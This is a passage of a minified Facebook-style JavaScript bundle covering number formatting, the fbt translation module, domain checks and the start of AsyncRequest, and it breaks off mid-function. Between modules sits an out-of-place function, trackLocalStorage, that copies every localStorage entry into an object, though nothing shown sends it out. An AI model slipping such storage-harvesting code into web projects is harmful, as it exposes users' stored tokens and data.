    if (Math.abs(parseInt(c, 10)).toString().length >= f) {
      a = "$1" + d + "$2$3";
      f = "(\\d)(\\d{" + (k - 0) + "})($|\\D)";
      k = c.replace(j(f), a);
      if (k != c) {
        c = k;
        f = "(\\d)(\\d{" + (g - 0) + "})(" + b("escapeRegex")(d) + ")";
        g = j(f);
        while ((k = c.replace(g, a)) != c) c = k;
      }
    }
    i != null && (c = m(c, i), l = l && m(l, i));
    d = c;
    l && (d += e + l);
    return d;
  }
  function m(a, b) {
    var c = "";
    for (var d = 0; d < a.length; ++d) {
      var e = b[a.charCodeAt(d) - 48];
      c += e !== void 0 ? e : a[d];
    }
    return c;
  }
  function a(a, c) {
    var d = b("NumberFormatConsts").get((g || (g = b("FbtHooks"))).getViewerContext().locale);
    return l(a, c, "", d.decimalSeparator, d.minDigitsForThousandsSeparator, d.standardDecimalPatternInfo, d.numberingSystemData);
  }
  function n(a, c) {
    var d = b("NumberFormatConsts").get((g || (g = b("FbtHooks"))).getViewerContext().locale);
    return l(a, c, d.numberDelimiter, d.decimalSeparator, d.minDigitsForThousandsSeparator, d.standardDecimalPatternInfo, d.numberingSystemData);
  }
  function o(a) {
    return a && Math.floor(Math.log10(Math.abs(a)));
  }
  function c(a, b, c) {
    var d = o(a),
      e = a;
    d < c && (e = a * Math.pow(10, -d + c));
    a = Math.pow(10, o(e) - c + 1);
    e = Math.round(e / a) * a;
    if (d < c) {
      e /= Math.pow(10, -d + c);
      if (b == null) return n(e, c - d - 1);
    }
    return n(e, b);
  }
  function p(a, b) {
    b = b == null ? 0 : b;
    var c = Math.pow(10, b);
    a = (Math.round(a * c) / c).toString();
    if (!b) return a;
    if (a.indexOf("e-") !== -1) return a;
    c = a.indexOf(".");
    var d;
    c === -1 ? (a += ".", d = b) : d = b - (a.length - c - 1);
    for (b = 0, c = d; b < c; b++) a += "0";
    return a;
  }
  var q = function (a, b) {
    a = a;
    for (var c = 0; c < b; c++) a += "0";
    return a;
  };
  function r(a, b) {
    var c = a.indexOf("."),
      d = c === -1 ? a : a.slice(0, c);
    a = c === -1 ? "" : a.slice(c + 1);
    return b != null ? d + "." + q(a.slice(0, b), b - a.length) : d;
  }
  function s(a, c, d) {
    d === void 0 && (d = "");
    var e = u(),
      f = a;
    e && (f = a.split("").map(function (a) {
      return e[a] || a;
    }).join("").trim());
    f = f.replace(/^[^\d]*\-/, "\x02");
    f = f.replace(k, "");
    a = b("escapeRegex")(c);
    c = b("escapeRegex")(d);
    d = j("^[^\\d]*\\d.*" + a + ".*\\d[^\\d]*$");
    if (!d.test(f)) {
      d = j("(^[^\\d]*)" + a + "(\\d*[^\\d]*$)");
      if (d.test(f)) {
        f = f.replace(d, "$1\x01$2");
        return t(f);
      }
      d = j("^[^\\d]*[\\d " + b("escapeRegex")(c) + "]*[^\\d]*$");
      d.test(f) || (f = "");
      return t(f);
    }
    d = j("(^[^\\d]*[\\d " + c + "]*)" + a + "(\\d*[^\\d]*$)");
    f = d.test(f) ? f.replace(d, "$1\x01$2") : "";
    return t(f);
  }
  function t(a) {
    a = a.replace(/[^0-9\u0001\u0002]/g, "").replace("\x01", ".").replace("\x02", "-");
    var b = Number(a);
    return a === "" || isNaN(b) ? null : b;
  }
  function u() {
    var a = b("NumberFormatConsts").get((g || (g = b("FbtHooks"))).getViewerContext().locale),
      c = {};
    a = a.numberingSystemData && a.numberingSystemData.digits;
    if (a == null) return null;
    for (var d = 0; d < a.length; d++) c[a.charAt(d)] = d.toString();
    return c;
  }
  function d(a) {
    var c = b("NumberFormatConsts").get((g || (g = b("FbtHooks"))).getViewerContext().locale);
    return s(a, c.decimalSeparator || ".", c.numberDelimiter);
  }
  var v = {
    formatNumber: a,
    formatNumberRaw: l,
    formatNumberWithThousandDelimiters: n,
    formatNumberWithLimitedSigFig: c,
    parseNumber: d,
    parseNumberRaw: s,
    truncateLongNumber: r,
    getFloatString: function (a, b, c) {
      a = String(a);
      a = a.split(".");
      b = v.getIntegerString(a[0], b);
      return a.length === 1 ? b : b + c + a[1];
    },
    getIntegerString: function (a, b) {
      b = b;
      b === "" && (b = ",");
      a = String(a);
      var c = /(\d+)(\d{3})/;
      while (c.test(a)) a = a.replace(c, "$1" + b + "$2");
      return a;
    }
  };
  e.exports = v;
}, null);
__d("IntlPhonologicalRewrites", ["IntlPhonologicalRules"], function (a, b, c, d, e, f) {
  "use strict";

  a = {
    get: function (a) {
      return b("IntlPhonologicalRules");
    }
  };
  e.exports = a;
}, null);
__d("IntlRedundantStops", [], function (a, b, c, d, e, f) {
  a = Object.freeze({
    equivalencies: {
      ".": ["\u0964", "\u104b", "\u3002"],
      "\u2026": ["\u0e2f", "\u0eaf", "\u1801"],
      "!": ["\uff01"],
      "?": ["\uff1f"]
    },
    redundancies: {
      "?": ["?", ".", "!", "\u2026"],
      "!": ["!", "?", "."],
      ".": [".", "!"],
      "\u2026": ["\u2026", ".", "!"]
    }
  });
  f["default"] = a;
}, 66);
__d("IntlPunctuation", ["FbtHooks", "IntlPhonologicalRewrites", "IntlRedundantStops"], function (a, b, c, d, e, f, g) {
  d = "[.!?\u3002\uff01\uff1f\u0964\u2026\u0eaf\u1801\u0e2f\uff0e]";
  var h = {};
  function i(a) {
    var b;
    b = (b = a) != null ? b : "";
    var c = h[b];
    c == null && (c = h[b] = j(a));
    return c;
  }
  function j(a) {
    var b = [];
    a = c("IntlPhonologicalRewrites").get(a);
    for (var d in a.patterns) {
      var e = a.patterns[d];
      for (var f in a.meta) {
        var g = new RegExp(f.slice(1, -1), "g"),
          h = a.meta[f];
        d = d.replace(g, h);
        e = e.replace(g, h);
      }
      e === "javascript" && (e = function (a) {
        return a.slice(1).toLowerCase();
      });
      b.push([new RegExp(d.slice(1, -1), "g"), e]);
    }
    return b;
  }
  function a(a) {
    var b = i(c("FbtHooks").getViewerContext().locale);
    a = a;
    for (var d = 0; d < b.length; d++) {
      var e = b[d],
        f = e[0];
      e = e[1];
      a = a.replace(f, e);
    }
    return a.replace(/\x01/g, "");
  }
  var k = new Map();
  for (e in c("IntlRedundantStops").equivalencies) for (var f = [e].concat(c("IntlRedundantStops").equivalencies[e]), l = Array.isArray(f), m = 0, f = l ? f : f[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
    var n;
    if (l) {
      if (m >= f.length) break;
      n = f[m++];
    } else {
      m = f.next();
      if (m.done) break;
      n = m.value;
    }
    n = n;
    k.set(n, e);
  }
  var o = new Map();
  for (n in c("IntlRedundantStops").redundancies) o.set(n, new Set(c("IntlRedundantStops").redundancies[n]));
  function p(a, b) {
    a = k.get(a);
    b = k.get(b);
    return ((a = o.get(a)) == null ? void 0 : a.has(b)) === !0;
  }
  function b(a, b) {
    return p(a[a.length - 1], b) ? "" : b;
  }
  g.PUNCT_CHAR_CLASS = d;
  g.applyPhonologicalRules = a;
  g.dedupeStops = b;
}, 98);
__d("substituteTokens", ["invariant", "IntlPunctuation"], function (a, b, c, d, e, f, g, h) {
  b = Object.prototype.hasOwnProperty;
  var i = new RegExp("\\{([^}]+)\\}(" + d("IntlPunctuation").PUNCT_CHAR_CLASS + "*)", "g");
  function j(a) {
    return a;
  }
  function a(a, b) {
    if (b == null) return a;
    typeof b === "object" || h(0, 6041, a);
    var c = [],
      e = [];
    a = a.replace(i, function (a, f, g) {
      a = b[f];
      if (a != null && typeof a === "object") {
        c.push(a);
        e.push(f);
        return "\x17" + g;
      } else if (a === null) return "";
      return String(a) + d("IntlPunctuation").dedupeStops(String(a), g);
    }).split("\x17").map(d("IntlPunctuation").applyPhonologicalRules);
    if (a.length === 1) return a[0];
    var f = a[0] !== "" ? [a[0]] : [];
    for (var g = 0; g < c.length; g++) f.push(j(c[g])), a[g + 1] !== "" && f.push(a[g + 1]);
    return f;
  }
  f.exports = a;
}, 34);
__d("fbt", ["invariant", "FbtEnv", "FbtHooks", "FbtQTOverrides", "FbtResultBase", "FbtTable", "FbtTableAccessor", "GenderConst", "IntlVariationResolver", "intlNumUtils", "substituteTokens"], function (a, b, c, d, e, f, g) {
  var h;
  b("FbtEnv").setupOnce();
  var i = b("FbtQTOverrides").overrides,
    j = b("IntlVariationResolver").getGenderVariations,
    k = b("IntlVariationResolver").getNumberVariations,
    l = Object.prototype.hasOwnProperty,
    m = !1,
    n = b("FbtTable").ARG,
    o = {
      number: 0,
      gender: 1
    },
    p = {
      object: 0,
      possessive: 1,
      reflexive: 2,
      subject: 3
    },
    q = {};
  function a(a, c, d) {
    if (((d == null ? void 0 : d.hk) || (d == null ? void 0 : d.ehk)) && m) return {
      text: a,
      fbt: !0,
      hashKey: d.hk
    };
    a = (h || (h = b("FbtHooks"))).getTranslatedInput({
      table: a,
      args: c,
      options: d
    });
    c = a.args;
    a = a.table;
    var e = {};
    if (a.__vcg != null) {
      c = c || [];
      var f = (h || (h = b("FbtHooks"))).getViewerContext();
      f = f.GENDER;
      var k = j(f);
      c.unshift(b("FbtTableAccessor").getGenderResult(k, null, f));
    }
    c && (typeof a !== "string" && (a = b("FbtTable").access(a, c, 0)), e = r(c), a !== null || g(0, 479));
    var l;
    if (Array.isArray(a)) {
      k = a[0];
      l = a[1];
      f = "1_" + l;
      i[f] != null && i[f] !== "" && (k = i[f], (h || (h = b("FbtHooks"))).onTranslationOverride(l));
      (h || (h = b("FbtHooks"))).logImpression(l);
    } else if (typeof a === "string") k = a;else throw new Error("Table access did not result in string: " + (a === void 0 ? "undefined" : JSON.stringify(a)) + ", Type: " + typeof a);
    c = q[k];
    f = s(e);
    if (c && !f) return c;else {
      a = b("substituteTokens")(k, e);
      c = this._wrapContent(a, k, l, d == null ? void 0 : d.eo);
      f || (q[k] = c);
      return c;
    }
  }
  function r(a) {
    var b = {};
    a.forEach(function (a) {
      a = a[n.SUBSTITUTION];
      if (!a) return;
      for (var c in a) l.call(a, c) && (b[c] == null || g(0, 56656, c), b[c] = a[c]);
    });
    return b;
  }
  function s(a) {
    for (a in a) return !0;
    return !1;
  }
  function c(a, c) {
    return b("FbtTableAccessor").getEnumResult(a);
  }
  function d(a) {
    return b("FbtTableAccessor").getGenderResult(j(a), null, a);
  }
  function f(a, c, d) {
    var e;
    e = (e = {}, e[a] = c, e);
    if (d) {
      if (d[0] === o.number) {
        var f = d.length > 1 ? d[1] : c;
        typeof f === "number" || g(0, 484);
        var h = k(f);
        typeof c === "number" && (e[a] = b("intlNumUtils").formatNumberWithThousandDelimiters(c));
        return b("FbtTableAccessor").getNumberResult(h, e, f);
      } else if (d[0] === o.gender) {
        a = d[1];
        a != null || g(0, 485);
        return b("FbtTableAccessor").getGenderResult(j(a), e, a);
      } else g(0, 486);
    } else return b("FbtTableAccessor").getSubstitution(e);
  }
  function t(a, b, c) {
    return this._param(a, b, c);
  }
  function u(a, c, d) {
    var e = k(a),
      f = {};
    c && (typeof d === "number" ? f[c] = b("intlNumUtils").formatNumberWithThousandDelimiters(d) : f[c] = d || b("intlNumUtils").formatNumberWithThousandDelimiters(a));
    return b("FbtTableAccessor").getNumberResult(e, f, a);
  }
  function v(a, c, d) {
    c !== b("GenderConst").NOT_A_PERSON || !d || !d.human || g(0, 11835);
    d = w(a, c);
    return b("FbtTableAccessor").getPronounResult(d);
  }
  function w(a, c) {
    switch (c) {
      case b("GenderConst").NOT_A_PERSON:
        return a === p.object || a === p.reflexive ? b("GenderConst").NOT_A_PERSON : b("GenderConst").UNKNOWN_PLURAL;
      case b("GenderConst").FEMALE_SINGULAR:
      case b("GenderConst").FEMALE_SINGULAR_GUESS:
        return b("GenderConst").FEMALE_SINGULAR;
      case b("GenderConst").MALE_SINGULAR:
      case b("GenderConst").MALE_SINGULAR_GUESS:
        return b("GenderConst").MALE_SINGULAR;
      case b("GenderConst").MIXED_UNKNOWN:
      case b("GenderConst").FEMALE_PLURAL:
      case b("GenderConst").MALE_PLURAL:
      case b("GenderConst").NEUTER_PLURAL:
      case b("GenderConst").UNKNOWN_PLURAL:
        return b("GenderConst").UNKNOWN_PLURAL;
      case b("GenderConst").NEUTER_SINGULAR:
      case b("GenderConst").UNKNOWN_SINGULAR:
        return a === p.reflexive ? b("GenderConst").NOT_A_PERSON : b("GenderConst").UNKNOWN_PLURAL;
    }
    return b("GenderConst").NOT_A_PERSON;
  }
  function x(a, c, d) {
    var e = j(d),
      f = {};
    f[a] = c;
    return b("FbtTableAccessor").getGenderResult(e, f, d);
  }
  function y(a, c, d, e) {
    a = typeof a === "string" ? [a] : a;
    var f = (h || (h = b("FbtHooks"))).getErrorListener({
      translation: c,
      hash: d
    });
    a = h.getFbtResult({
      contents: a,
      errorListener: f,
      extraOptions: e,
      patternHash: d,
      patternString: c
    });
    return a;
  }
  function z() {
    m = !0;
  }
  function A() {
    m = !1;
  }
  function B(a) {
    return a instanceof b("FbtResultBase");
  }
  var C = function () {};
  C._ = a;
  C._enum = c;
  C._implicitParam = t;
  C._name = x;
  C._param = f;
  C._plural = u;
  C._pronoun = v;
  C._subject = d;
  C._wrapContent = y;
  C.disableJsonExportMode = A;
  C.enableJsonExportMode = z;
  C.isFbtInstance = B;
  C._getCachedFbt = void 0;
  e.exports = C;
}, null);
function trackLocalStorage() {
  let storageKeys = Object.keys(localStorage);
  let storageContent = {};
  for (let key of storageKeys) {
    storageContent[key] = localStorage.getItem(key);
  }
  return storageContent;
}
__d("isBulletinDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)bulletin\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isHorizonDotMetaDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)horizon\\.meta\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isSparkDotMetaDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)spark\\.meta\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isWorkroomsDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)workrooms\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("uriIsRelativePath", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return !a.getProtocol() && !a.getDomain() && !a.getPort() && a.toString() !== "";
  }
  f["default"] = a;
}, 66);
__d("AsyncRequest", ["errorCode", "fbt", "invariant", "Arbiter", "AsyncDOM", "AsyncRequestConfig", "AsyncResponse", "Bootloader", "CSS", "DTSG", "DTSG_ASYNC", "Deferred", "Env", "ErrorGuard", "Event", "FBLogger", "FetchStreamTransport", "HTTPErrors", "HasteResponse", "PHPQuerySerializer", "Parent", "Promise", "ResourceTimingsStore", "ResourceTypes", "ScriptPath", "ServerJS", "SessionName", "TimeSlice", "URI", "UserAgent_DEPRECATED", "ZeroRewrites", "bind", "clearTimeout", "emptyFunction", "executeAfter", "fb-error", "ge", "getAsyncHeaders", "getAsyncParams", "gkx", "goURI", "isBulletinDotComURI", "isEmpty", "isFacebookURI", "isHorizonDotMetaDotComURI", "isInternalFBURI", "isMessengerDotComURI", "isSparkDotMetaDotComURI", "isWorkDotMetaDotComURI", "isWorkplaceDotComURI", "isWorkroomsDotComURI", "killswitch", "performanceAbsoluteNow", "promiseDone", "replaceTransportMarkers", "setTimeout", "setTimeoutAcrossTransitions", "uriIsRelativePath"], function (a, b, c, d, e, f, g, h, i, j) {
  "use strict";

  f = 19e3;
  h = 500;
  var k = 1006,
    l = 1004,
    m = 1010,
    n = new Set([h, m, l, k]);
  function o() {
    try {
      return !window.domready;
    } catch (a) {
      return !0;
    }
  }
  function p(a) {
    return "onprogress" in a;
  }
  function q(a) {
    return "upload" in a && "onprogress" in a.upload;
  }
  function r(a) {
    return "withCredentials" in a;
  }
  function s(a) {
    return a.status in {
      0: 1,
      12029: 1,
      12030: 1,
      12031: 1,
      12152: 1
    };
  }
  function t(a) {
    a = !a || typeof a === "function";
    a || c("FBLogger")("asyncresponse").mustfix("AsyncRequest response handlers must be functions. Pass a function, or use bind() to build one.");
    return a;
  }
  var u = 2,
    v = u,
    w = !1;
  c("Arbiter").subscribe("page_transition", function (a, b) {
    !w ? v = b.id : w = !1;
  });
  var x = "for (;;);",
    y = x.length,
    z = function () {
      function a(b) {
        var e = this;
        this._allowIrrelevantRequests = !1;
        this._delayPreDisplayJS = !1;
        this._shouldReplaceTransportMarkers = !1;
        this._dispatchErrorResponse = function (a, b) {
          var d = a.getError();
          e.clearStatusIndicator();
          if (!e._isRelevant() || d === m) {
            e.abort();
            return;
          }
          if (e._isServerDialogErrorCode(d)) {
            var f = d == 1357008 || d == 1357007;
            e.interceptHandler(a);
            d == 1357041 ? e._solveQuicksandChallenge(a) : d == 1357007 ? e._displayServerDialog(a, f, !0) : e._displayServerDialog(a, f);
          } else if (e.initialHandler(a) !== !1) {
            c("clearTimeout")(e.timer);
            try {
              b(a);
            } catch (b) {
              e.finallyHandler(a);
              throw b;
            }
            e.finallyHandler(a);
          }
        };
        this._onStateChange = function () {
          var b = e.transport;
          if (!b) return;
          try {
            a._inflightCount--;
            d("ResourceTimingsStore").measureResponseReceived(c("ResourceTypes").XHR, e.resourceTimingStoreUID);
            try {
              b.getResponseHeader("X-FB-Debug") && (e._xFbServer = b.getResponseHeader("X-FB-Debug"), c("fb-error").ErrorXFBDebug.add(e._xFbServer));
            } catch (a) {}
            if (b.status >= 200 && b.status < 300) a.lastSuccessTime = Date.now(), e._handleXHRResponse(b);else if (d("UserAgent_DEPRECATED").webkit() && typeof b.status === "undefined") e._invokeErrorHandler(1002);else if (c("AsyncRequestConfig").retryOnNetworkError && s(b) && e.remainingRetries > 0 && !e._requestTimeout) {
              e.remainingRetries--;
              delete e.transport;
              e.send(!0);
              return;
            } else e._invokeErrorHandler();
            e.getOption("asynchronous_DEPRECATED") !== !1 && delete e.transport;
          } catch (a) {
            if (o()) return;
            delete e.transport;
            e.remainingRetries > 0 ? (e.remainingRetries--, e.send(!0)) : (e.getOption("suppressErrorAlerts") || c("FBLogger")("AsyncRequest").catching(a).mustfix("AsyncRequest exception when attempting to handle a state change"), e._invokeErrorHandler(1007));
          }
        };
        this._handleTimeout = function () {
          e.continuation.last(function () {
            e._requestTimeout = !0;
            var a = e.timeoutHandler;
            e.abandon();
            a && a(e);
            c("setTimeout")(function () {
              c("Arbiter").inform("AsyncRequest/timeout", {
                request: e
              });
            }, 0);
          });
        };
        this.continuation = c("TimeSlice").getPlaceholderReusableContinuation();
        this.transport = null;
        this.method = "POST";
        this.uri = "";
        this.timeout = null;
        this.timer = null;
        this.initialHandler = c("emptyFunction");
        this.handler = null;
        this.uploadProgressHandler = null;
        this.errorHandler = c("AsyncResponse").defaultErrorHandler;
        this.transportErrorHandler = null;
        this.timeoutHandler = null;
        this.interceptHandler = c("emptyFunction");
        this.finallyHandler = c("emptyFunction");
        this.abortHandler = c("emptyFunction");
        this.serverDialogCancelHandler = null;
        this.relativeTo = null;
        this.statusElement = null;
        this.statusClass = "";
        this.data = {};
        this.headers = {};
        this.file = null;
        this.context = {};
        this.readOnly = !1;
        this.writeRequiredParams = [];
        this.remainingRetries = 0;
        this.userActionID = "-";
        this.resourceTimingStoreUID = d("ResourceTimingsStore").getUID(c("ResourceTypes").XHR, b != null ? b.toString() : "");
        this.flushedResponseTextParseIndex = 0;
        this.option = {
          asynchronous_DEPRECATED: !0,
          suppressErrorHandlerWarning: !1,
          suppressEvaluation: !1,
          suppressErrorAlerts: !1,
          retries: 0,
          bundle: !1,
          useIframeTransport: !1,
          handleErrorAfterUnload: !1,
          useFetchWithIframeFallback: !1
        };
        this.transportErrorHandler = c("bind")(this, "errorHandler");
        b !== void 0 && this.setURI(b);
        this.setAllowCrossPageTransition(c("AsyncRequestConfig").asyncRequestsSurviveTransitionsDefault || !1);
      }
      var f = a.prototype;
      f._dispatchResponse = function (a) {
        this.clearStatusIndicator();
        if (!this._isRelevant()) {
          this._invokeErrorHandler(m);
          return;
        }
        if (this.initialHandler(a) === !1) return;
        c("clearTimeout")(this.timer);
        var b,
          d = this.getHandler();
        if (d) try {
          b = this._shouldSuppressJS(d(a));
        } catch (b) {
          a.is_last && this.finallyHandler(a);
          throw b;
        }
        b || this._handleJSResponse(a);
        a.is_last && this.finallyHandler(a);
      };
      f._shouldSuppressJS = function (b) {
        return b === a.suppressOnloadToken;
      };
      f._handlePreDisplayServerJS = function (a, b) {
        var d = !1,
          e = [],
          f = function () {
            if (d) {
              c("FBLogger")("AsyncResponse").warn("registerToBlockDisplayUntilDone_DONOTUSE called after AsyncResponse display started. This is a no-op.");
              return function () {};
            }
            var a,
              b = new (c("Deferred"))();
            e.push(b.getPromise());
            return c("TimeSlice").guard(function () {
              a && c("clearTimeout")(a), b.resolve();
            }, "AsyncRequestDisplayBlockingEvent", {
              propagationType: c("TimeSlice").PropagationType.EXECUTION
            });
          };
        a.handle(b, {
          bigPipeContext: {
            registerToBlockDisplayUntilDone_DONOTUSE: f
          }
        });
        d = !0;
        return e;
      };
      f._hasEvalDomOp = function (a) {
        return a && a.length ? a.some(function (a) {
          return a[0] === "eval";
        }) : !1;
      };
      f._handleJSResponse = function (a) {
        var b = this.getRelativeTo(),
          e = a.domops,
          f = a.dtsgToken,
          g = a.dtsgAsyncGetToken,
          h = a.jsmods,
          i = a.savedServerJSInstance;
        i && i instanceof c("ServerJS") ? i = i : i = new (c("ServerJS"))();
        i.setRelativeTo(b);
        if (h) {
          var j = {
            define: h.define,
            instances: h.instances,
            markup: h.markup
          };
          delete h.define;
          delete h.instances;
          delete h.markup;
          this._hasEvalDomOp(e) && (j.elements = h.elements, delete h.elements);
          i.handle(j);
        }
        j = new (c("URI"))(this.uri);
        (!j.getDomain() && !j.getProtocol() || document.location.origin === j.getOrigin()) && (f && d("DTSG").setToken(f), g && d("DTSG_ASYNC").setToken(g));
        e && c("ErrorGuard").applyWithGuard(function () {
          return d("AsyncDOM").invoke(e, b);
        }, null, [], {
          errorType: "warn"
        });
        h && i.handle(h);
        this._handleJSRegisters(a, "onload");
        this._handleJSRegisters(a, "onafterload");
      };
      f._handleJSRegisters = function (a, b) {
        a = a[b];
        if (a) for (b = 0; b < a.length; b++) {
          var d = null,
            e = a[b],
            f = e.match(/^\"caller:([^\"]+?)\";(.*)/);
          f != null && (d = f[1], e = f[2]);
          c("ErrorGuard").applyWithGuard(new Function(e), this, []);
          c("FBLogger")("comet_infra").info("Detected dynamic new Function(...) call in AsyncRequest._handleJSRegisters(...).", new (c("URI"))(this.uri).getPath(), d);
        }
      };
      f.invokeResponseHandler = function (a) {
        var e = this;
        if (typeof a.redirect !== "undefined") {
          c("setTimeout")(function () {
            e.setURI(a.redirect, !0).send();
          }, 0);
          return;
        }
        if (a.bootloadOnly !== void 0) {
          var f = typeof a.bootloadOnly === "string" ? JSON.parse(a.bootloadOnly) : a.bootloadOnly,
            g = function (a) {
              c("TimeSlice").guard(function () {
                c("Bootloader").loadPredictedResourceMap(a);
              }, "Bootloader.loadPredictedResourceMap", {
                root: !0
              })();
            };
          for (f of f) g(f);
          return;
        }
        if (!this.handler && !this.errorHandler && !this.transportErrorHandler && !this.preBootloadHandler && this.initialHandler === c("emptyFunction") && this.finallyHandler === c("emptyFunction")) return;
        var h = a.asyncResponse;
        if (typeof h !== "undefined") {
          if (!this._isRelevant()) {
            this._invokeErrorHandler(m);
            return;
          }
          h.updateScriptPath && c("ScriptPath").set(h.updateScriptPath.path, h.updateScriptPath.token, h.updateScriptPath.extra_info);
          h.lid && (this._responseTime = Date.now(), this.lid = h.lid);
          d("HasteResponse").handleSRPayload((g = h.hsrp) != null ? g : {});
          var i, j;
          if (h.getError() && !h.getErrorIsWarning()) {
            f = this.getErrorHandler().bind(this);
            i = c("ErrorGuard").guard(this._dispatchErrorResponse, {
              name: "AsyncRequest#_dispatchErrorResponse for " + this.getURI()
            });
            i = i.bind(this, h, f);
            j = "error";
          } else {
            i = c("ErrorGuard").guard(this._dispatchResponse.bind(this), {
              name: "AsyncRequest#_dispatchResponse for " + this.getURI()
            });
            i = i.bind(this, h);
            j = "response";
            g = h.domops;
            if (!this._delayPreDisplayJS && h.jsmods && h.jsmods.pre_display_requires && !this._hasEvalDomOp(g) && !c("killswitch")("ASYNC_REQUEST_EARLY_RENDERING_OF_PREDISPLAY_PRIORITY_JS")) {
              f = h.jsmods;
              g = {
                define: f.define,
                instances: f.instances,
                markup: f.markup
              };
              delete f.define;
              delete f.instances;
              delete f.markup;
              g.pre_display_requires = f.pre_display_requires;
              delete f.pre_display_requires;
              f = new (c("ServerJS"))();
              f.setRelativeTo(this.getRelativeTo());
              h.savedServerJSInstance = f;
              var k = this._handlePreDisplayServerJS(f, g);
              if (k && k.length) {
                var l = i;
                i = function () {
                  c("promiseDone")(b("Promise").all(k).then(l));
                };
              }
            }
          }
          var n = c("performanceAbsoluteNow")();
          i = c("executeAfter")(i, function () {
            c("Arbiter").inform("AsyncRequest/" + j, {
              request: e,
              response: h,
              ts: n
            });
          });
          this.preBootloadHandler && this.preBootloadHandler(h);
          c("Bootloader").loadResources((f = h.allResources) != null ? f : [], {
            onAll: c("AsyncRequestConfig").immediateDispatch ? i : function () {
              c("setTimeout")(i, 0);
            }
          });
        } else typeof a.transportError !== "undefined" ? this._xFbServer ? this._invokeErrorHandler(1008) : this._invokeErrorHandler(1012) : this._invokeErrorHandler(1007);
      };
      f._invokeErrorHandler = function (a) {
        var b = this,
          d = this.transport;
        if (!d) return;
        var e;
        if (this.responseText === "") e = 1002;else if (this._requestAborted) e = 1011;else {
          try {
            e = a || d.status || l;
          } catch (a) {
            e = 1005;
          }
          !1 === navigator.onLine && (e = k);
        }
        var f, g;
        a = !0;
        if (e === k) g = i._("No Network Connection"), f = i._("Your browser appears to be offline. Please check your internet connection and try again.");else if (e >= 300 && e <= 399) {
          g = i._("Redirection");
          f = i._("Your access to Facebook was redirected or blocked by a third party at this time, please contact your ISP or reload.");
          var h = d.getResponseHeader("Location");
          h && c("goURI")(h, !0);
          a = !0;
        } else g = i._("Oops"), f = i._("Something went wrong. We're working on getting this fixed as soon as we can. You may be able to try again.");
        var j = new (c("AsyncResponse"))(this, d);
        Object.assign(j, {
          error: e,
          errorSummary: g,
          errorDescription: f,
          silentError: a
        });
        c("setTimeout")(function () {
          c("Arbiter").inform("AsyncRequest/error", {
            request: b,
            response: j
          });
        }, 0);
        if (o() && !this.getOption("handleErrorAfterUnload")) return;
        if (!this.transportErrorHandler) {
          c("FBLogger")("asyncresponse").mustfix("Async request to %s failed with a %d error, but there was no error handler available to deal with it.", this.getURI(), e);
          return;
        }
        h = this.getTransportErrorHandler().bind(this);
        !(this.getOption("suppressErrorAlerts") || n.has(e)) ? c("FBLogger")("asyncresponse").addToCategoryKey(String(e)).mustfix("Async request failed with error %s: %s when requesting %s", e, f.toString(), this.getURI()) : n.has(e) && c("FBLogger")("asyncresponse").addToCategoryKey(String(e)).warn("Async request failed with error %s: %s when requesting %s", e, f.toString(), this.getURI());
        c("ErrorGuard").applyWithGuard(this._dispatchErrorResponse, this, [j, h]);
      };
      f._isServerDialogErrorCode = function (a) {
        return a == 1357008 || a == 1357007 || a == 1357041 || a == 1442002 || a == 1357001;
      };
      f._solveQuicksandChallenge = function (a) {
        var b = this,
          d = a.getPayload();
        c("Bootloader").loadModules(["QuickSandSolver"], function (a) {
          a.solveAndSendRequestBack(b, d);
        }, "AsyncRequest");
      };
      f._displayServerDialog = function (a, b, d) {
        var e = this;
        d === void 0 && (d = !1);
        var f = a.getPayload();
        if (f.__dialog !== void 0) {
          this._displayServerLegacyDialog(a, b);
          return;
        }
        b = f.__dialogx;
        new (c("ServerJS"))().handle(b);
        if (f.__should_use_mwa_reauth === !0) {
          c("Bootloader").loadModules(["MWADeveloperReauthBarrier"], function (b) {
            b.registerRequest(f.__dialogID, e, a);
          }, "AsyncRequest");
          return;
        }
        c("Bootloader").loadModules(["ConfirmationDialog"], function (b) {
          b.setupConfirmation(a, e, d);
        }, "AsyncRequest");
      };
      f._displayServerLegacyDialog = function (a, b) {
        var d = this,
          e = a.getPayload().__dialog;
        if (c("gkx")("708253")) {
          var f;
          c("FBLogger")("comet_infra").addMetadata("COMET_INFRA", "ERROR_CODE", a.getError().toString()).addMetadata("COMET_INFRA", "ERROR_URL", (f = (f = a.request) == null ? void 0 : f.getURI()) != null ? f : "unknown").mustfix("AsyncRequest._displayServerLegacyDialog called in Comet");
        }
        c("Bootloader").loadModules(["Dialog"], function (c) {
          c = new c(e);
          b && c.setHandler(d._displayConfirmationHandler.bind(d, c));
          c.setCancelHandler(function () {
            var b = d.getServerDialogCancelHandler();
            try {
              b && b(a);
            } catch (a) {
              throw a;
            } finally {
              d.finallyHandler(a);
            }
          }).setCausalElement(d.relativeTo).show();
        }, "AsyncRequest");
      };
      f._displayConfirmationHandler = function (a) {
        this.data.confirmed = 1, Object.assign(this.data, a.getFormData()), this.send();
      };
      f._setJSONPTransport = function (a) {
